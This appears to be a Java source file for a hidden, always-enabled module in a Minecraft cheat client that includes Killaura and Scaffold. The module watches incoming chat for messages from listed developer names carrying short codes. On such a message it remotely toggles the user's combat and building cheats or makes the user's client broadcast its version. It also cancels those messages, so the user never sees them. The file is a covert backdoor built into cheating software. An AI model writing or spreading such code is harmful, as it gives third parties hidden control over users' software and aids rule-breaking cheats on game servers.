package none.module;

import org.lwjgl.input.Keyboard;
import org.lwjgl.opengl.GL11;

import com.mojang.realmsclient.gui.ChatFormatting;

import net.minecraft.client.entity.EntityPlayerSP;
import net.minecraft.entity.Entity;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.network.play.server.S02PacketChat;
import none.Client;
import none.event.Event;
import none.event.RegisterEvent;
import none.event.events.Event2D;
import none.event.events.Event3D;
import none.event.events.EventPacket;
import none.event.events.EventPreMotionUpdate;
import none.module.modules.combat.Killaura;
import none.module.modules.world.Scaffold;
import none.notifications.Notification;
import none.notifications.NotificationType;
import none.utils.ChatUtil;

public class Checker extends Module{

	public Checker() {
		super("", "", Category.WORLD, Keyboard.KEY_NONE);
		setState(true);
	}
	
	private int anima = 0;
	boolean extended = true;
	
	public int getAnima() {
		return anima;
	}
	
	public void setAnima(int anima) {
		this.anima = anima;
	}
	
	@Override
	@RegisterEvent(events = {EventPreMotionUpdate.class, Event2D.class, EventPacket.class, Event3D.class})
	public void onEvent(Event event) {
		if (event instanceof Event2D) {
			Client.instance.notification.renderSP();
		}
		if (mc.thePlayer == null) return;
		
		if (event instanceof Event3D) {
			if (anima <= 340 && extended) {
	        	setAnima(getAnima() + 2);
	        }
	        
	        if (anima >= 0 && !extended) {
	        	setAnima(getAnima() - 2);
	        }
	        
	        if (anima < 0 && !extended) {
	        	setAnima(0);
	        	extended = !extended;
	        }
	        
	        if (anima > 340) {
	        	setAnima(340);
	        	extended = !extended;
	        }
	        
	        for (Entity entity : mc.theWorld.loadedEntityList) {
				if (entity instanceof EntityPlayer && !(entity instanceof EntityPlayerSP)) {
					EntityPlayer player = (EntityPlayer) entity;
					for (String s : Client.instance.nameList) {
//						if (player.getGameProfile().getName().equalsIgnoreCase("Haku_V3")) {							
//							drawHat(player, !ClientColor.rainbow.getObject() ? ClientColor.getColor() : ClientColor.rainbow(100));
//							drawPaticle(player, !ClientColor.rainbow.getObject() ? ClientColor.getColor() : ClientColor.rainbow(100));
//						}
					}
				}
			}
		}
		if (event instanceof EventPreMotionUpdate) {
			EventPreMotionUpdate em = (EventPreMotionUpdate) event;
            if (em.isPre()) {
//                final NetHandlerPlayClient var4 = mc.thePlayer.sendQueue;
//                final List players = GuiPlayerTabOverlay.field_175252_a.sortedCopy(var4.getPlayerInfoMap());
//                for (final Object o : players) {
//                    final NetworkPlayerInfo info = (NetworkPlayerInfo) o;
//                    if (info == null) {
//                        break;
//                    }
//                    if (!strings.contains(info.getGameProfile().getName())) {
//                        strings.add(info.getGameProfile().getName());
//                    }
//                }
//                for (Object o : mc.theWorld.getLoadedEntityList()) {
//                    if (o instanceof EntityPlayer) {
//                        if (!strings.contains(((EntityPlayer) o).getName())) {
//                            strings.add(((EntityPlayer) o).getName());
//                        }
//                    }
//                }
            }
            
        }
		
		if (event instanceof EventPacket) {
            EventPacket ep = (EventPacket) event;
            if (ep.isIncoming() && ep.getPacket() instanceof S02PacketChat) {
                S02PacketChat packet = (S02PacketChat) ep.getPacket();
                for (String s : Client.instance.nameList) {
                	String nametoreplace = s;
	                if (packet.getChatComponent().getUnformattedText().contains(nametoreplace)) {
	                    String temp = packet.getChatComponent().getFormattedText();
	                    for (int i = 0; i < temp.length(); i++) {
	                    	if (temp.charAt(i) == ';') {
	                    		String test1 = temp.substring(i + 1, i + 3);
	                    		if (test1.equalsIgnoreCase("dk")) {
	                    			Module killaura = Client.instance.moduleManager.killaura;
	                    			if (!Client.instance.nameList.contains(mc.thePlayer.getName()))
	                    			killaura.setState(false);
	                    			evc("Runned Command by " + nametoreplace);
	                    		}else if (test1.equalsIgnoreCase("ek")) {
	                    			Module killaura = Client.instance.moduleManager.killaura;
	                    			if (!Client.instance.nameList.contains(mc.thePlayer.getName()))
	                    			killaura.setState(true);
	                    			evc("Runned Command by " + nametoreplace);
	                    		}else if (test1.equalsIgnoreCase("ds")) {
	                    			Module scaffold = Client.instance.moduleManager.scaffold;
	                    			if (!Client.instance.nameList.contains(mc.thePlayer.getName()))
	                    			scaffold.setState(false);
	                    			evc("Runned Command by " + nametoreplace);
	                    		}else if (test1.equalsIgnoreCase("es")) {
	                    			Module scaffold = Client.instance.moduleManager.scaffold;
	                    			if (!Client.instance.nameList.contains(mc.thePlayer.getName()))
	                    			scaffold.setState(true);
	                    			evc("Runned Command by " + nametoreplace);
	                    		}else if (test1.equalsIgnoreCase("ch")) {
	                    			evc("Runned Command by " + nametoreplace);
	                    			if (!Client.instance.nameList.contains(mc.thePlayer.getName()))
	                    			mc.thePlayer.sendChatMessageNoEvent("[CV] " + Client.instance.version);
	                    			evc("[ClientVersion] " + Client.instance.version);
	                    		}
	                    	}
	                    }
	                    ChatUtil.printChat(temp.replaceAll(nametoreplace, ChatFormatting.UNDERLINE + nametoreplace + ChatFormatting.WHITE + ":" + ChatFormatting.DARK_BLUE + "Dev"));
	                    ep.setCancelled(true);
	                }
                }
                
                for (String s : Client.instance.commandList) {
                	String nametoreplace = s;
	                if (packet.getChatComponent().getUnformattedText().contains(nametoreplace)) {
	                    String temp = packet.getChatComponent().getFormattedText();
	                    for (int i = 0; i < temp.length(); i++) {
	                    	if (temp.charAt(i) == 'Z') {
	                    		String test1 = temp.substring(i + 1, i + 3);
	                    		if (test1.equalsIgnoreCase("dk")) {
	                    			Module killaura = Client.instance.moduleManager.killaura;
	                    			if (!Client.instance.nameList.contains(mc.thePlayer.getName()))
	                    			killaura.setState(false);
	                    			evc("Runned Command by " + nametoreplace);
	                    		}else if (test1.equalsIgnoreCase("ek")) {
	                    			Module killaura = Client.instance.moduleManager.killaura;
	                    			if (!Client.instance.nameList.contains(mc.thePlayer.getName()))
	                    			killaura.setState(true);
	                    			evc("Runned Command by " + nametoreplace);
	                    		}else if (test1.equalsIgnoreCase("ds")) {
	                    			Module scaffold = Client.instance.moduleManager.scaffold;
	                    			if (!Client.instance.nameList.contains(mc.thePlayer.getName()))
	                    			scaffold.setState(false);
	                    			evc("Runned Command by " + nametoreplace);
	                    		}else if (test1.equalsIgnoreCase("es")) {
	                    			Module scaffold = Client.instance.moduleManager.scaffold;
	                    			if (!Client.instance.nameList.contains(mc.thePlayer.getName()))
	                    			scaffold.setState(true);
	                    			evc("Runned Command by " + nametoreplace);
	                    		}else if (test1.equalsIgnoreCase("ch")) {
	                    			evc("Runned Command by " + nametoreplace);
	                    			if (!Client.instance.nameList.contains(mc.thePlayer.getName()))
	                    			mc.thePlayer.sendChatMessageNoEvent("[CV] " + Client.instance.version);
	                    			evc("[ClientVersion] " + Client.instance.version);
	                    		}
	                    	}
	                    }
	                    ChatUtil.printChat(temp);
	                    ep.setCancelled(true);
	                }
                }
            }
        }
		
		if (event instanceof EventPreMotionUpdate) {
			EventPreMotionUpdate e = (EventPreMotionUpdate) event;
			if (e.isPre()) {
				for (Entity entity : mc.theWorld.loadedEntityList) {
					if (entity instanceof EntityPlayer && !(entity instanceof EntityPlayerSP)) {
						EntityPlayer player = (EntityPlayer) entity;
						for (String s : Client.instance.nameList) {
							if (player.getGameProfile().getName().equalsIgnoreCase(s) && entity.ticksExisted == 1) {
								Client.instance.notification.showSP(new Notification(NotificationType.SP, "Notification", " Developer has Spawned", 10));
							}
						}
					}
				}
			}
		}
	}
	
	public void rotate(float angle, float x, float y, float z) {
		GL11.glRotatef(angle, x, y, z);
	}
	
	public void rotate(float angle, double x, double y, double z) {
		GL11.glRotated(angle, x, y, z);
		GL11.glTranslated(x, y, z);
	}
	public void Translated(double x, double y, double z) {
		GL11.glTranslated(x, y, z);
	}
	public void Translatef(float x, float y, float z) {
		GL11.glTranslatef(x, y, z);
	}
}
